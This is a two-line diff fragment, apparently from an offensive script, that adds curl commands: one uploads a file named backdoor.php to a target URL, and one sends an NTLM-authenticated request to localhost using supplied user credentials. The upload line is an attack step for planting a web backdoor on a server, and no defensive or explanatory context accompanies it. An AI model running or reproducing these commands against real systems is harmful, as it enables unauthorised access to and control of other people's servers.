@@ -1,0 +1,2 @@
+curl "$TARGET" --upload-file backdoor.php -v
+curl --ntlm -u "$USER":"$PASSWORD" 127.0.0.1
